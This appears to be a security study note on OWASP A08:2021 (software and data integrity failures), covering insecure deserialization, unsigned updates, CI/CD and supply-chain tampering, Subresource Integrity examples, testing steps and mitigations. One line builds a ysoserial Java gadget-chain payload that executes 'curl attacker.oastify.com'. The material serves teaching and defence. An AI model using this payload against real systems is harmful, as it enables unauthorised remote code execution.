# Software and Data Integrity Failures (A08:2021)

New in 2021, this category is about trusting code, data, or updates **without verifying their integrity**. If your app pulls in software or data from a source that could be tampered with - and you don't check signatures/hashes - an attacker who controls that source runs code in your environment. It absorbed **Insecure Deserialization** from the 2017 list.

## Sub-areas

- **Insecure deserialization** - rebuilding objects from untrusted data (RCE) - see [Insecure Deserialization](../Vulnerabilities/Insecure%20Deserialization.md)
- **Unsigned / unverified updates** - auto-update mechanisms that don't check signatures
- **CI/CD pipeline tampering** - poisoned build steps, malicious dependencies
- **Supply chain attacks** - compromised packages (event-stream, SolarWinds, `ua-parser-js`)
- **Untrusted CDNs / plugins** without Subresource Integrity (SRI)

## What to test

```text
1. Deserialization: find serialized blobs (cookies, tokens, ViewState) and try gadget chains.
2. Auto-update: does the client verify a signature before installing? MITM it in a lab.
3. Third-party scripts: are <script> tags from CDNs missing integrity= (SRI)?
4. CI/CD: are build dependencies pinned + hash-verified? Is the pipeline writable?
```

## Example - missing Subresource Integrity (SRI)

```html
<!-- VULNERABLE - if the CDN is compromised, arbitrary JS runs on your site -->
<script src="https://cdn.example.com/lib.js"></script>

<!-- SAFE - browser refuses the file if its hash doesn't match -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

## Example - insecure deserialization to RCE

```bash
# Java gadget chain -> command execution when the blob is deserialized
java -jar ysoserial.jar CommonsCollections5 'curl attacker.oastify.com' | base64 -w0
```

## Tools

- [ysoserial](https://github.com/frohoff/ysoserial) / [PHPGGC](https://github.com/ambionics/phpggc) - deserialization gadgets
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/), [Sigstore/cosign](https://github.com/sigstore/cosign) - artifact signing

## Mitigation - the fix

- **Digitally sign** code/artifacts and **verify signatures** before use (updates, packages, containers).
- Don't deserialize untrusted data; if you must, use integrity checks + allowlists.
- Use **SRI** for third-party scripts; pin dependency versions with hashes (lockfiles).
- Harden CI/CD: least privilege, protected branches, signed commits, verified builds.
- Vet and monitor your software supply chain (SBOM).

## Practice

- [PortSwigger deserialization labs](https://portswigger.net/web-security/deserialization)

## Reference

- [OWASP A08:2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
